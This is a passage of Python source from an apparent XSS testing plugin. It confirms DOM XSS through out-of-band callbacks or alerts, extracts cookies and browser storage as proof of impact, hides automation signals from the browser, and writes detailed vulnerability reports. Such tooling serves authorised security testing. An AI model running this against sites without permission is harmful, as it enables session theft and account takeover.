                is_verified, interactions = self.callback_verifier.verify_callback(payload_id, wait=True)
                
                if is_verified:
                    # Collect evidence - ALWAYS collect for verified exploits
                    evidence_data = self._collect_dom_evidence(driver)
                    
                    # Generate business impact narrative
                    temp_finding = {'evidence_data': evidence_data}
                    business_impact = self._generate_business_impact_narrative(temp_finding)
                    
                    # Build proof of impact text
                    proof_of_impact = f"✓ VERIFIED XSS - Callback confirmed JavaScript execution\n\n"
                    proof_of_impact += f"Payload ID: {payload_id}\n"
                    proof_of_impact += f"Callback Interactions: {len(interactions)}\n\n"
                    
                    # Add callback details
                    for i, interaction in enumerate(interactions[:3], 1):
                        proof_of_impact += f"Callback #{i}:\n"
                        proof_of_impact += f"  Timestamp: {interaction.get('timestamp', 'N/A')}\n"
                        proof_of_impact += f"  Source IP: {interaction.get('source_ip', 'N/A')}\n"
                        proof_of_impact += f"  Method: {interaction.get('http_method', 'N/A')}\n"
                        proof_of_impact += f"  Path: {interaction.get('http_path', 'N/A')}\n\n"
                    
                    # Add extracted data
                    if evidence_data.get('cookies') or evidence_data.get('local_storage') or evidence_data.get('session_storage'):
                        proof_of_impact += "Extracted Data:\n"
                        if evidence_data.get('cookies'):
                            proof_of_impact += f"- Cookies: {len(evidence_data['cookies'])} cookie(s) accessible\n"
                        if evidence_data.get('local_storage'):
                            proof_of_impact += f"- localStorage: {len(evidence_data['local_storage'])} item(s)\n"
                        if evidence_data.get('session_storage'):
                            proof_of_impact += f"- sessionStorage: {len(evidence_data['session_storage'])} item(s)\n"
                        if evidence_data.get('document_domain'):
                            proof_of_impact += f"- Document Domain: {evidence_data['document_domain']}\n"
                        proof_of_impact += "\n"
                    
                    # Add actions performed
                    if evidence_data.get('actions_performed'):
                        proof_of_impact += "Actions Performed:\n"
                        for action in evidence_data['actions_performed']:
                            proof_of_impact += f"- {action}\n"
                        proof_of_impact += "\n"
                    
                    # Add business impact
                    proof_of_impact += business_impact
                    
                    finding = {
                        'type': 'dom',
                        'url': test_url,
                        'parameter': parameter or 'unknown',
                        'method': method,
                        'payload': actual_payload,
                        'payload_id': payload_id,
                        'context': 'dom',
                        'evidence': f"✓ VERIFIED: XSS callback received from {len(interactions)} source(s)",
                        'severity': 'high',
                        'timestamp': datetime.now().isoformat(),
                        'verified': True,  # Mark as VERIFIED when callback confirmed
                        'verification_method': 'callback',
                        'callback_interactions': interactions,
                        'proof_of_impact': proof_of_impact,
                        'business_impact': business_impact,
                    }
                    
                    if evidence_data:
                        finding['evidence_data'] = evidence_data
                    
                    # Capture GIF proof for verified XSS
                    self._capture_gif_proof(finding)
                    
                    logger.info(f"✓ XSS VERIFIED via callback for payload {payload_id}")
                    return finding
                else:
                    logger.info(f"✗ No callback received for payload {payload_id}")
                    # Don't return a finding if callback wasn't verified
                    return None
            
            else:
                # Traditional alert-based detection (fallback or if callback disabled)
                try:
                    WebDriverWait(driver, 3).until(EC.alert_is_present())
                    alert = driver.switch_to.alert
                    alert_text = alert.text
                    alert.accept()
                    
                    # Collect evidence - ALWAYS collect for verified exploits
                    evidence_data = self._collect_dom_evidence(driver)
                    
                    # Generate business impact narrative
                    temp_finding = {'evidence_data': evidence_data}
                    business_impact = self._generate_business_impact_narrative(temp_finding)
                    
                    # Build proof of impact text
                    proof_of_impact = f"Evidence: JavaScript successfully executed in browser context\n\n"
                    proof_of_impact += f"Alert Dialog: {alert_text}\n\n"
                    
                    # Add extracted data
                    if evidence_data.get('cookies') or evidence_data.get('local_storage') or evidence_data.get('session_storage'):
                        proof_of_impact += "Extracted Data:\n"
                        if evidence_data.get('cookies'):
                            proof_of_impact += f"- Cookies: {len(evidence_data['cookies'])} cookie(s) accessible\n"
                        if evidence_data.get('local_storage'):
                            proof_of_impact += f"- localStorage: {len(evidence_data['local_storage'])} item(s)\n"
                        if evidence_data.get('session_storage'):
                            proof_of_impact += f"- sessionStorage: {len(evidence_data['session_storage'])} item(s)\n"
                        if evidence_data.get('document_domain'):
                            proof_of_impact += f"- Document Domain: {evidence_data['document_domain']}\n"
                        proof_of_impact += "\n"
                    
                    # Add actions performed
                    if evidence_data.get('actions_performed'):
                        proof_of_impact += "Actions Performed:\n"
                        for action in evidence_data['actions_performed']:
                            proof_of_impact += f"- {action}\n"
                        proof_of_impact += "\n"
                    
                    # Add business impact
                    proof_of_impact += business_impact
                    
                    finding = {
                        'type': 'dom',
                        'url': test_url,
                        'parameter': parameter or 'unknown',
                        'method': method,
                        'payload': actual_payload,
                        'context': 'dom',
                        'evidence': f"XSS triggered alert dialog: {alert_text}",
                        'severity': 'high',
                        'timestamp': datetime.now().isoformat(),
                        'verified': True,  # Mark as VERIFIED when real impact evidence collected
                        'verification_method': 'alert',
                        'proof_of_impact': proof_of_impact,
                        'business_impact': business_impact,
                    }
                    
                    if evidence_data:
                        finding['evidence_data'] = evidence_data
                    
                    # Capture GIF proof for verified XSS
                    self._capture_gif_proof(finding)
                    
                    return finding
                
                except TimeoutException:
                    # No alert triggered, but check console logs for errors
                    console_logs = self._get_console_logs(driver)
                    if console_logs and any('error' in log.lower() for log in console_logs):
                        # NOTE: Console errors are NOT marked as verified
                        # Only actual JavaScript execution (callback or alert) counts as SUCCESS
                        logger.debug(f"Console errors detected but not verified as exploitable XSS")
                        return None  # Don't report unverified findings
        
        except Exception as e:
            logger.debug(f"Error testing DOM XSS: {e}")
        finally:
            if driver:
                try:
                    driver.quit()
                except Exception:
                    pass
        
        return None
    
    def _setup_browser(self, browser_type: str, headless: bool,
                      randomize_fingerprint: bool) -> Any:
        """Setup Selenium browser with configuration."""
        if browser_type == 'firefox':
            options = FirefoxOptions()
            if headless:
                options.add_argument('--headless')
            
            if randomize_fingerprint:
                user_agent = self._get_random_user_agent()
                options.set_preference('general.useragent.override', user_agent)
            
            driver = webdriver.Firefox(options=options)
        else:
            options = ChromeOptions()
            if headless:
                options.add_argument('--headless')
            
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--disable-web-security')
            options.add_argument('--allow-running-insecure-content')
            
            if randomize_fingerprint:
                user_agent = self._get_random_user_agent()
                options.add_argument(f'user-agent={user_agent}')
                
                # Additional fingerprint randomization
                options.add_argument('--disable-blink-features=AutomationControlled')
                options.add_experimental_option("excludeSwitches", ["enable-automation"])
                options.add_experimental_option('useAutomationExtension', False)
            
            driver = webdriver.Chrome(options=options)
        
        # Set timeouts
        driver.set_page_load_timeout(30)
        driver.implicitly_wait(10)
        
        return driver
    
    def _collect_dom_evidence(self, driver: Any) -> Dict:
        """Collect DOM evidence from the browser including real impact data."""
        evidence = {}
        
        try:
            # Get page source
            evidence['html_sample'] = driver.page_source[:5000]  # First 5000 chars
            
            # Get current URL
            evidence['current_url'] = driver.current_url
            
            # Get page title
            evidence['page_title'] = driver.title
            
            # Get console logs
            evidence['console_logs'] = self._get_console_logs(driver)
            
            # Take screenshot
            screenshot_data = self._take_screenshot(driver)
            if screenshot_data:
                evidence['screenshot'] = screenshot_data
            
            # NEW: Collect real impact evidence
            # Extract cookies
            evidence['cookies'] = self._extract_cookies(driver)
            
            # Extract localStorage
            evidence['local_storage'] = self._extract_local_storage(driver)
            
            # Extract sessionStorage
            evidence['session_storage'] = self._extract_session_storage(driver)
            
            # Get document domain
            evidence['document_domain'] = self._get_document_domain(driver)
            
            # Collect actions performed (DOM manipulation, etc.)
            evidence['actions_performed'] = self._detect_actions_performed(driver, evidence)
        
        except Exception as e:
            logger.warning(f"Error collecting DOM evidence: {e}")
        
        return evidence
    
    def _get_console_logs(self, driver: Any) -> List[str]:
        """Get console logs from browser."""
        try:
            logs = driver.get_log('browser')
            return [log['message'] for log in logs[:20]]  # First 20 logs
        except Exception:
            return []
    
    def _take_screenshot(self, driver: Any) -> Optional[str]:
        """Take screenshot and return as base64 string."""
        try:
            screenshot = driver.get_screenshot_as_png()
            screenshot_b64 = base64.b64encode(screenshot).decode('utf-8')
            return screenshot_b64
        except Exception as e:
            logger.warning(f"Error taking screenshot: {e}")
            return None
    
    def _extract_cookies(self, driver: Any) -> Dict[str, Any]:
        """Extract cookies from the browser."""
        try:
            cookies = driver.get_cookies()
            cookie_data = {}
            for cookie in cookies:
                cookie_data[cookie['name']] = {
                    'value': cookie.get('value', ''),
                    'domain': cookie.get('domain', ''),
                    'path': cookie.get('path', ''),
                    'httpOnly': cookie.get('httpOnly', False),
                    'secure': cookie.get('secure', False),
                    'sameSite': cookie.get('sameSite', 'None')
                }
            return cookie_data
        except Exception as e:
            logger.warning(f"Error extracting cookies: {e}")
            return {}
    
    def _extract_local_storage(self, driver: Any) -> Dict[str, str]:
        """Extract localStorage from the browser."""
        try:
            local_storage = driver.execute_script("""
                var items = {};
                for (var i = 0; i < localStorage.length; i++) {
                    var key = localStorage.key(i);
                    items[key] = localStorage.getItem(key);
                }
                return items;
            """)
            return local_storage or {}
        except Exception as e:
            logger.warning(f"Error extracting localStorage: {e}")
            return {}
    
    def _extract_session_storage(self, driver: Any) -> Dict[str, str]:
        """Extract sessionStorage from the browser."""
        try:
            session_storage = driver.execute_script("""
                var items = {};
                for (var i = 0; i < sessionStorage.length; i++) {
                    var key = sessionStorage.key(i);
                    items[key] = sessionStorage.getItem(key);
                }
                return items;
            """)
            return session_storage or {}
        except Exception as e:
            logger.warning(f"Error extracting sessionStorage: {e}")
            return {}
    
    def _get_document_domain(self, driver: Any) -> str:
        """Get document.domain from the browser."""
        try:
            domain = driver.execute_script("return document.domain;")
            return domain or ''
        except Exception as e:
            logger.warning(f"Error getting document domain: {e}")
            return ''
    
    def _detect_actions_performed(self, driver: Any, evidence: Dict) -> List[str]:
        """Detect what actions were performed based on collected evidence."""
        actions = []
        
        # Check for session data exposure
        cookies = evidence.get('cookies', {})
        if cookies:
            actions.append('Cookies accessed')
            non_httponly = [name for name, data in cookies.items() if not data.get('httpOnly')]
            if non_httponly:
                actions.append(f'Non-HTTPOnly cookies exposed: {", ".join(non_httponly[:3])}')
        
        # Check for localStorage/sessionStorage exposure
        local_storage = evidence.get('local_storage', {})
        if local_storage:
            actions.append(f'localStorage accessed ({len(local_storage)} items)')
            # Check for sensitive keys
            sensitive_keys = [k for k in local_storage.keys() if any(s in k.lower() for s in ['token', 'auth', 'session', 'user', 'credential', 'password'])]
            if sensitive_keys:
                actions.append(f'Sensitive data in localStorage: {", ".join(sensitive_keys[:3])}')
        
        session_storage = evidence.get('session_storage', {})
        if session_storage:
            actions.append(f'sessionStorage accessed ({len(session_storage)} items)')
        
        # Check for DOM manipulation
        html_sample = evidence.get('html_sample', '')
        if html_sample:
            actions.append('HTML DOM accessed')
        
        # Check console logs for specific actions
        console_logs = evidence.get('console_logs', [])
        if console_logs:
            actions.append(f'Console activity detected ({len(console_logs)} messages)')
        
        return actions
    
    def _generate_business_impact_narrative(self, finding: Dict) -> str:
        """Generate a business/security impact narrative based on evidence."""
        narrative_parts = []
        
        # Get evidence data
        evidence_data = finding.get('evidence_data', {})
        cookies = evidence_data.get('cookies', {})
        local_storage = evidence_data.get('local_storage', {})
        session_storage = evidence_data.get('session_storage', {})
        actions = evidence_data.get('actions_performed', [])
        
        # Analyze impact
        impact_level = 'HIGH'
        
        # Check for session hijacking potential
        if cookies:
            non_httponly = [name for name, data in cookies.items() if not data.get('httpOnly')]
            if non_httponly:
                narrative_parts.append(
                    f"**Session Hijacking Risk:** {len(non_httponly)} session cookie(s) are accessible "
                    f"to JavaScript (not protected by HTTPOnly flag). An attacker can steal these cookies "
                    f"to impersonate the victim user."
                )
                impact_level = 'CRITICAL'
        
        # Check for credential exposure
        sensitive_keys = []
        if local_storage:
            sensitive_keys.extend([k for k in local_storage.keys() if any(s in k.lower() for s in ['token', 'auth', 'password', 'credential'])])
        if session_storage:
            sensitive_keys.extend([k for k in session_storage.keys() if any(s in k.lower() for s in ['token', 'auth', 'password', 'credential'])])
        
        if sensitive_keys:
            narrative_parts.append(
                f"**Credential/Token Exposure:** Authentication tokens or credentials are stored in "
                f"browser storage ({', '.join(list(set(sensitive_keys))[:3])}). An attacker can exfiltrate "
                f"these to gain unauthorized access to the victim's account."
            )
            impact_level = 'CRITICAL'
        
        # Check for user data exposure
        if local_storage or session_storage:
            total_items = len(local_storage) + len(session_storage)
            narrative_parts.append(
                f"**User Data Exposure:** {total_items} item(s) in browser storage are accessible. "
                f"This may include personal information, preferences, or application state that could "
                f"be exfiltrated or modified by an attacker."
            )
        
        # DOM manipulation
        if 'HTML DOM accessed' in actions:
            narrative_parts.append(
                "**DOM Manipulation:** The attacker can read and modify the entire page DOM, "
                "enabling phishing attacks, content injection, and UI manipulation to trick users."
            )
        
        # General XSS impact
        narrative_parts.append(
            "**General XSS Impact:** This vulnerability allows an attacker to execute arbitrary "
            "JavaScript in the victim's browser context, potentially leading to:"
        )
        narrative_parts.append("- Account takeover via session theft")
        narrative_parts.append("- Phishing attacks through page content modification")
        narrative_parts.append("- Keylogging and form data theft")
        narrative_parts.append("- Malware distribution")
        narrative_parts.append("- Defacement")
        
        # Business consequences
        narrative_parts.append("\n**Business Consequences:**")
        narrative_parts.append("- User account compromise and data breach")
        narrative_parts.append("- Reputational damage and loss of user trust")
        narrative_parts.append("- Regulatory compliance violations (GDPR, PCI-DSS)")
        narrative_parts.append("- Potential legal liability")
        narrative_parts.append("- Financial losses from fraud or service disruption")
        
        # Add impact level
        narrative = f"**IMPACT LEVEL: {impact_level}**\n\n" + "\n".join(narrative_parts)
        
        return narrative
    
    def _test_form_for_xss(self, form: Dict, enable_dom_testing: bool,
                          browser_type: str, headless: bool,
                          randomize_fingerprint: bool, collect_evidence: bool,
                          network_throttle: float) -> List[Dict]:
        """Test a form for XSS vulnerabilities."""
        findings = []
        
        action = form['action']
        method = form['method']
        inputs = form['inputs']
        
        # Get test payloads
        payloads = self.generate_payloads({'payload_type': 'basic'})
        
        # Test each input field
        for input_field in inputs:
            if input_field['type'] in ['submit', 'button', 'hidden']:
                continue
            
            for payload in payloads[:10]:  # Limit to first 10 payloads per input
                if network_throttle > 0:
                    time.sleep(network_throttle)
                
                # Build form data
                form_data = {}
                for inp in inputs:
                    if inp['name'] == input_field['name']:
                        form_data[inp['name']] = payload
                    else:
                        form_data[inp['name']] = inp.get('value', 'test')
                
                # Test form
                finding = self._test_reflected_xss(
                    action, input_field['name'], method, {}, form_data, payload
                )
                if finding:
                    finding['form_action'] = action
                    findings.append(finding)
        
        return findings
    
    def _generate_report(self, target_url: str, findings: List[Dict],
                        output_format: str, output_dir: str) -> Optional[str]:
        """Generate vulnerability report in JSON, HTML, and/or Markdown format."""
        try:
            # Create output directory
            os.makedirs(output_dir, exist_ok=True)
            
            # Generate timestamp-based filename
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            domain = urlparse(target_url).netloc.replace(':', '_')
            
            report_paths = []
            
            # Generate JSON report
            if output_format in ['json', 'both', 'all']:
                json_path = os.path.join(output_dir, f'xss_report_{domain}_{timestamp}.json')
                self._generate_json_report(target_url, findings, json_path)
                report_paths.append(json_path)
            
            # Generate HTML report
            if output_format in ['html', 'both', 'all']:
                html_path = os.path.join(output_dir, f'xss_report_{domain}_{timestamp}.html')
                self._generate_html_report(target_url, findings, html_path)
                report_paths.append(html_path)
            
            # Generate Markdown report
            if output_format in ['markdown', 'md', 'all']:
                md_path = os.path.join(output_dir, f'xss_report_{domain}_{timestamp}.md')
                self._generate_markdown_report(target_url, findings, md_path)
                report_paths.append(md_path)
            
            return ', '.join(report_paths) if report_paths else None
        
        except Exception as e:
            logger.error(f"Error generating report: {e}")
            return None
    
    def _generate_json_report(self, target_url: str, findings: List[Dict],
                             output_path: str) -> None:
        """Generate JSON report."""
        report = {
            'scan_info': {
                'target_url': target_url,
                'timestamp': datetime.now().isoformat(),
                'scanner': self.name,
                'version': self.version,
            },
            'summary': {
                'total_vulnerabilities': len(findings),
                'severity_breakdown': self._get_severity_breakdown(findings),
                'vulnerability_types': list(set(f['type'] for f in findings)),
            },
            'findings': findings,
        }
        
        with open(output_path, 'w') as f:
            json.dump(report, f, indent=2)
        
        logger.info(f"JSON report saved to: {output_path}")
    
    def _generate_html_report(self, target_url: str, findings: List[Dict],
                             output_path: str) -> None:
        """Generate HTML report with real impact evidence."""
        html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>XSS Vulnerability Report - Real Impact Evidence</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .header {{ background: #2c3e50; color: white; padding: 20px; border-radius: 5px; }}
        .summary {{ background: white; padding: 20px; margin: 20px 0; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
        .finding {{ background: white; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 4px solid #e74c3c; }}
        .high {{ border-left-color: #e74c3c; }}
        .medium {{ border-left-color: #f39c12; }}
        .low {{ border-left-color: #3498db; }}
        .verified-badge {{ background: #27ae60; color: white; padding: 5px 10px; border-radius: 3px; display: inline-block; margin-bottom: 10px; }}
        .proof-section {{ background: #e8f8f5; border: 2px solid #27ae60; padding: 15px; margin: 15px 0; border-radius: 5px; }}
        .impact-section {{ background: #fff3cd; border: 2px solid #ffc107; padding: 15px; margin: 15px 0; border-radius: 5px; }}
        .code {{ background: #ecf0f1; padding: 10px; border-radius: 3px; font-family: monospace; overflow-x: auto; white-space: pre-wrap; }}
        .evidence-data {{ background: #f8f9fa; padding: 10px; margin: 10px 0; border-radius: 3px; border: 1px solid #dee2e6; }}
        .screenshot {{ max-width: 100%; border: 1px solid #ddd; margin: 10px 0; border-radius: 3px; }}
        h1, h2, h3 {{ margin: 0 0 10px 0; }}
        .timestamp {{ color: #7f8c8d; font-size: 0.9em; }}
        ul {{ margin: 10px 0; padding-left: 20px; }}
        .verified-count {{ color: #27ae60; font-weight: bold; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>XSS Vulnerability Report - Real Impact Evidence</h1>
        <p>Target: {target_url}</p>
        <p class="timestamp">Generated: {timestamp}</p>
    </div>
    
    <div class="summary">
        <h2>Summary</h2>
        <p><strong>Total Vulnerabilities:</strong> {total_vulns}</p>
        <p class="verified-count"><strong>✓ Verified (Real Impact):</strong> {verified_count}</p>
        <p><strong>High Severity:</strong> {high_count}</p>
        <p><strong>Medium Severity:</strong> {medium_count}</p>
        <p><strong>Low Severity:</strong> {low_count}</p>
    </div>
    
    <h2>Findings</h2>
    {findings_html}
    
    <div class="summary">
        <h2>Remediation Advice</h2>
        <p>{remediation}</p>
    </div>
</body>
</html>
"""
        
        # Build findings HTML
        findings_html = []
        verified_count = 0
        
        for i, finding in enumerate(findings, 1):
            severity = finding.get('severity', 'medium')
            is_verified = finding.get('verified', False)
            
            if is_verified:
                verified_count += 1
            
            # Basic finding info
            finding_html = f"""
    <div class="finding {severity}">
        {'<div class="verified-badge">✓ VERIFIED - Real Impact Proven</div>' if is_verified else ''}
        <h3>Finding #{i} - {finding.get('type', 'XSS').upper()} XSS</h3>
        <p><strong>URL:</strong> {finding.get('url', 'N/A')}</p>
        <p><strong>Parameter:</strong> {finding.get('parameter', 'N/A')}</p>
        <p><strong>Method:</strong> {finding.get('method', 'N/A')}</p>
        <p><strong>Context:</strong> {finding.get('context', 'N/A')}</p>
        <p><strong>Severity:</strong> {severity.upper()}</p>
        <p><strong>Evidence:</strong> {finding.get('evidence', 'N/A')}</p>
        <div class="code">Payload: {finding.get('payload', 'N/A')}</div>
"""
            
            # Add proof of impact section for verified vulnerabilities
            if is_verified and finding.get('proof_of_impact'):
                finding_html += f"""
        <div class="proof-section">
            <h3>🔍 Proof of Impact (Verified Vulnerability)</h3>
            <div class="code">{finding.get('proof_of_impact', 'N/A')}</div>
        </div>
"""
            
            # Add extracted data details
            evidence_data = finding.get('evidence_data', {})
            if evidence_data:
                finding_html += """
        <div class="evidence-data">
            <h4>📊 Extracted Data:</h4>
"""
                # Cookies
                cookies = evidence_data.get('cookies', {})
                if cookies:
                    finding_html += f"""
            <p><strong>Cookies ({len(cookies)} found):</strong></p>
            <ul>
"""
                    for name, data in list(cookies.items())[:5]:  # Show first 5
                        http_only_status = '🔒 HTTPOnly' if data.get('httpOnly') else '⚠️ No HTTPOnly'
                        finding_html += f"                <li><code>{name}</code> - {http_only_status}</li>\n"
                    if len(cookies) > 5:
                        finding_html += f"                <li>... and {len(cookies) - 5} more</li>\n"
                    finding_html += """            </ul>
"""
                
                # localStorage
                local_storage = evidence_data.get('local_storage', {})
                if local_storage:
                    finding_html += f"""
            <p><strong>localStorage ({len(local_storage)} items):</strong></p>
            <ul>
"""
                    for key in list(local_storage.keys())[:5]:  # Show first 5
                        finding_html += f"                <li><code>{key}</code></li>\n"
                    if len(local_storage) > 5:
                        finding_html += f"                <li>... and {len(local_storage) - 5} more</li>\n"
                    finding_html += """            </ul>
"""
                
                # sessionStorage
                session_storage = evidence_data.get('session_storage', {})
                if session_storage:
                    finding_html += f"""
            <p><strong>sessionStorage ({len(session_storage)} items):</strong></p>
            <ul>
"""
                    for key in list(session_storage.keys())[:5]:
                        finding_html += f"                <li><code>{key}</code></li>\n"
                    if len(session_storage) > 5:
                        finding_html += f"                <li>... and {len(session_storage) - 5} more</li>\n"
                    finding_html += """            </ul>
"""
                
                # Document domain
                if evidence_data.get('document_domain'):
                    finding_html += f"""
            <p><strong>Document Domain:</strong> <code>{evidence_data.get('document_domain')}</code></p>
"""
                
                # Actions performed
                actions = evidence_data.get('actions_performed', [])
                if actions:
                    finding_html += """
            <p><strong>Actions Performed:</strong></p>
            <ul>
"""
                    for action in actions:
                        finding_html += f"                <li>{action}</li>\n"
                    finding_html += """            </ul>
"""
                
                # Console logs
                console_logs = evidence_data.get('console_logs', [])
                if console_logs:
                    finding_html += f"""
            <p><strong>Console Logs ({len(console_logs)} messages):</strong></p>
            <div class="code">{chr(10).join(console_logs[:10])}</div>
"""
                
                # Screenshot
                if evidence_data.get('screenshot'):
                    finding_html += """
            <p><strong>Screenshot:</strong></p>
            <img class="screenshot" src="data:image/png;base64,{screenshot}" alt="XSS Exploit Screenshot" />
""".format(screenshot=evidence_data.get('screenshot'))
                
                finding_html += """
        </div>
"""
            
            # Add business impact section
            if finding.get('business_impact'):
                finding_html += f"""
        <div class="impact-section">
            <h3>💼 Business/Security Impact</h3>
            <div class="code">{finding.get('business_impact', 'N/A')}</div>
        </div>
"""
            
            # Add GIF proof section if available
            if finding.get('proof_gif'):
                gif_path = finding.get('proof_gif', '')
                finding_html += f"""
        <div class="proof-section">
            <h3>🎥 Visual Proof (GIF Recording)</h3>
            <p>A visual recording of the XSS exploitation has been captured:</p>
            <img src="{gif_path}" alt="XSS Exploitation GIF" class="screenshot" style="max-width: 800px;" />
            <p><a href="{gif_path}" download style="color: #27ae60; font-weight: bold;">⬇️ Download GIF Proof</a></p>
        </div>
"""
            
            finding_html += """
    </div>
"""
            findings_html.append(finding_html)
        
        # Get severity breakdown
        severity_breakdown = self._get_severity_breakdown(findings)
        
        # Format HTML
        html = html_template.format(
            target_url=target_url,
            timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            total_vulns=len(findings),
            verified_count=verified_count,
            high_count=severity_breakdown.get('high', 0),
            medium_count=severity_breakdown.get('medium', 0),
            low_count=severity_breakdown.get('low', 0),
            findings_html=''.join(findings_html),
            remediation=self.get_remediation_advice(),
        )
        
        with open(output_path, 'w') as f:
            f.write(html)
        
        logger.info(f"HTML report saved to: {output_path}")
    
    def _generate_markdown_report(self, target_url: str, findings: List[Dict],
                                  output_path: str) -> None:
        """Generate Markdown report with real impact evidence."""
        # Count verified findings
        verified_count = sum(1 for f in findings if f.get('verified', False))
        severity_breakdown = self._get_severity_breakdown(findings)
        
        # Build markdown content
        md_content = f"""# XSS Vulnerability Report - Real Impact Evidence

**Target:** {target_url}  
**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  
**Scanner:** {self.name} v{self.version}

---

## Summary

- **Total Vulnerabilities:** {len(findings)}
- **✓ Verified (Real Impact):** {verified_count}
- **High Severity:** {severity_breakdown.get('high', 0)}
- **Medium Severity:** {severity_breakdown.get('medium', 0)}
- **Low Severity:** {severity_breakdown.get('low', 0)}

---

## Findings

"""
        
        # Add each finding
        for i, finding in enumerate(findings, 1):
            severity = finding.get('severity', 'medium').upper()
            is_verified = finding.get('verified', False)
            vuln_type = finding.get('type', 'XSS').upper()
            
            md_content += f"""### Finding #{i} - {vuln_type} XSS

{f'✓ **VERIFIED - Real Impact Proven**' if is_verified else ''}

- **URL:** `{finding.get('url', 'N/A')}`
- **Parameter:** `{finding.get('parameter', 'N/A')}`
- **Method:** {finding.get('method', 'N/A')}
- **Context:** {finding.get('context', 'N/A')}
- **Severity:** {severity}
- **Verification Method:** {finding.get('verification_method', 'N/A')}
- **Evidence:** {finding.get('evidence', 'N/A')}

**Payload:**
```
{finding.get('payload', 'N/A')}
```

"""
            
            # Add callback verification details if present
            if finding.get('verification_method') == 'callback' and finding.get('callback_interactions'):
                interactions = finding.get('callback_interactions', [])
                md_content += f"""#### 📡 Callback Verification Details

**Payload ID:** `{finding.get('payload_id', 'N/A')}`  
**Callback Interactions:** {len(interactions)}

"""
                for idx, interaction in enumerate(interactions[:3], 1):
                    md_content += f"""**Interaction #{idx}:**
- Timestamp: {interaction.get('timestamp', 'N/A')}
- Source IP: {interaction.get('source_ip', 'N/A')}
- HTTP Method: {interaction.get('http_method', 'N/A')}
- HTTP Path: {interaction.get('http_path', 'N/A')}

"""
                if len(interactions) > 3:
                    md_content += f"... and {len(interactions) - 3} more interaction(s)\n\n"
            
            # Add proof of impact for verified findings
            if is_verified and finding.get('proof_of_impact'):
                md_content += f"""#### 🔍 Proof of Impact (Verified Vulnerability)

```
{finding.get('proof_of_impact')}
```

"""
            
            # Add extracted data details
            evidence_data = finding.get('evidence_data', {})
            if evidence_data:
                md_content += """#### 📊 Extracted Data

"""
                # Cookies
                cookies = evidence_data.get('cookies', {})
                if cookies:
                    md_content += f"""**Cookies ({len(cookies)} found):**
"""
                    for name, data in list(cookies.items())[:5]:
                        http_only_status = '🔒 HTTPOnly' if data.get('httpOnly') else '⚠️ No HTTPOnly'
                        md_content += f"- `{name}` - {http_only_status}\n"
                    if len(cookies) > 5:
                        md_content += f"- ... and {len(cookies) - 5} more\n"
                    md_content += "\n"
                
                # localStorage
                local_storage = evidence_data.get('local_storage', {})
                if local_storage:
                    md_content += f"""**localStorage ({len(local_storage)} items):**
"""
                    for key in list(local_storage.keys())[:5]:
                        md_content += f"- `{key}`\n"
                    if len(local_storage) > 5:
                        md_content += f"- ... and {len(local_storage) - 5} more\n"
                    md_content += "\n"
                
                # sessionStorage
                session_storage = evidence_data.get('session_storage', {})
                if session_storage:
                    md_content += f"""**sessionStorage ({len(session_storage)} items):**
"""
                    for key in list(session_storage.keys())[:5]:
                        md_content += f"- `{key}`\n"
                    if len(session_storage) > 5:
                        md_content += f"- ... and {len(session_storage) - 5} more\n"
                    md_content += "\n"
                
                # Document domain
                if evidence_data.get('document_domain'):
                    md_content += f"""**Document Domain:** `{evidence_data.get('document_domain')}`

"""
                
                # Actions performed
                actions = evidence_data.get('actions_performed', [])
                if actions:
                    md_content += """**Actions Performed:**
"""
                    for action in actions:
                        md_content += f"- {action}\n"
                    md_content += "\n"
                
                # Console logs
                console_logs = evidence_data.get('console_logs', [])
                if console_logs:
                    md_content += f"""**Console Logs ({len(console_logs)} messages):**
```
{chr(10).join(console_logs[:10])}
```

"""
                
                # Screenshot info
                if evidence_data.get('screenshot'):
                    md_content += """**Screenshot:** Captured (see HTML report for image)

"""
            
            # Add business impact
            if finding.get('business_impact'):
                md_content += f"""#### 💼 Business/Security Impact

{finding.get('business_impact')}

"""
            
            # Add GIF proof if available
            if finding.get('proof_gif'):
                gif_path = finding.get('proof_gif', '')
                md_content += f"""#### 🎥 Visual Proof (GIF Recording)

A visual recording of the XSS exploitation has been captured:

![XSS Exploitation GIF]({gif_path})

[Download GIF Proof]({gif_path})

"""
            
            md_content += "---\n\n"
        
        # Add remediation advice
        md_content += f"""## Remediation Advice

{self.get_remediation_advice()}

---

*Report generated by {self.name} v{self.version}*
"""
        
        # Write to file
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(md_content)
        
        logger.info(f"Markdown report saved to: {output_path}")
    
    def _get_severity_breakdown(self, findings: List[Dict]) -> Dict[str, int]:
        """Get breakdown of findings by severity."""
        breakdown = {'high': 0, 'medium': 0, 'low': 0}
        for finding in findings:
            severity = finding.get('severity', 'medium')
            breakdown[severity] = breakdown.get(severity, 0) + 1
        return breakdown
    
    def _cleanup(self) -> None:
        """Cleanup resources."""
        if self.session:
            try:
                self.session.close()
            except Exception:
                pass
            self.session = None
        
        if self.driver:
            try:
                self.driver.quit()
            except Exception:
                pass
            self.driver = None
    
    def verify(self, result: Dict[str, Any], 
               target_url: str,
               vulnerability_data: Dict[str, Any]) -> tuple:
        """
        Verify XSS exploitation with concrete proof of JavaScript execution.
        
        Only mark as verified if we have concrete proof that JavaScript was executed
        in a browser context (e.g., callback received, DOM manipulation, alert triggered).
        
        Args:
            result: The result from execute_attack()
            target_url: The target URL
            vulnerability_data: Vulnerability data
            
        Returns:
            Tuple[bool, str]: (is_verified, proof_of_impact)
        """
        if not result.get('success'):
            return False, None
        
        # Check for callback-based verification (strongest proof)
        if result.get('callback_verified'):
            callback_data = result.get('callback_data', {})
            payload_used = result.get('payload', 'unknown')
            
            proof_lines = [
                "✓ VERIFIED - Cross-Site Scripting (XSS)",
                "",
                "Verification Method: Callback-based (Out-of-Band)",
                f"Payload: {payload_used[:100]}",
                ""
            ]
            
            if callback_data:
                proof_lines.append("Callback Details:")
                proof_lines.append(f"  - Callback URL: {callback_data.get('callback_url', 'N/A')}")
